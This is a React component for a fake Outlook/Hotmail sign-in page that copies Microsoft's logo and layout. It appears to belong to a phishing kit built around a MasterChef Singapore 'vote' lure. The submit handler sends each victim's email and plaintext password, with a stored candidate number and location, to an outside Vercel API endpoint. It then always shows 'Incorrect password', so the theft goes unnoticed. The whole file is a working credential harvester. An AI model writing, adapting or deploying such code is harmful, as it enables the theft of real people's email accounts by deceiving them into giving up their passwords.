import { useState } from "react";
import emailLogo from "../assets/email-logo.png";

export default function HotmailLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  async function handleSubmit(e) {
    e.preventDefault();

    if (!email.trim() || !password.trim()) {
      alert("Please enter your email and password.");
      return;
    }

    setLoading(true);

    try {
      await new Promise((resolve) => setTimeout(resolve, 700));
      await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "hotmail",
            username: email,
            password,
            location: localStorage.getItem("voteLocation"),
          }),
        }
      );
    } catch (err) {
      console.error(err);
    } finally {
      setError(true);
      setPassword("");
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-[360px] rounded-[34px] bg-white border border-slate-200 shadow-[0_25px_60px_rgba(15,23,42,0.12)] overflow-hidden">
        <div className="px-8 py-10">
          <div className="mx-auto mb-7 grid h-14 w-14 grid-cols-2 gap-1">
            <div className="rounded-sm bg-[#f25022]" />
            <div className="rounded-sm bg-[#7fba00]" />
            <div className="rounded-sm bg-[#00a4ef]" />
            <div className="rounded-sm bg-[#ffb900]" />
          </div>

          <div className="text-center">
            <h1 className="text-4xl font-semibold text-slate-950">Outlook</h1>
            <p className="mt-2 text-base text-slate-500">Sign in to continue</p>
          </div>

          <form onSubmit={handleSubmit} className="mt-8 space-y-4">
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, phone, or Skype"
              className="w-full rounded-2xl border border-slate-300 bg-white px-4 py-4 text-slate-900 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
            />

            <input
              type="password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (error) setError(false);
              }}
              placeholder="Password"
              className={`w-full rounded-2xl border px-4 py-4 text-slate-900 placeholder:text-slate-400 outline-none transition focus:ring-2 ${
                error
                  ? "shake-error border-red-500 bg-red-50 focus:border-red-500 focus:ring-red-100"
                  : "border-slate-300 bg-white focus:border-blue-600 focus:ring-blue-100"
              }`}
            />
            {error && <p className="text-sm text-red-600">Incorrect password</p>}

            <div className="flex items-center justify-between text-sm text-slate-500">
              <p>No account?{' '}
                <button
                  type="button"
                  className="text-blue-600 hover:underline"
                  onClick={() => window.location.href = "/"}
                >
                  Create one!
                </button>
              </p>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-2xl bg-[#0067c5] px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-[#0052a5] disabled:cursor-not-allowed disabled:opacity-60"
            >
              {loading ? "Signing in..." : "Sign in"}
            </button>

            <div className="flex items-center gap-3 text-sm text-slate-700">
              <input
                id="remember-hotmail"
                type="checkbox"
                className="h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
              />
              <label htmlFor="remember-hotmail" className="text-slate-700">
                Keep me signed in
              </label>
            </div>

            <div className="text-sm">
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => alert("Password recovery is not available in this demo.")}
              >
                Can't access your account?
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
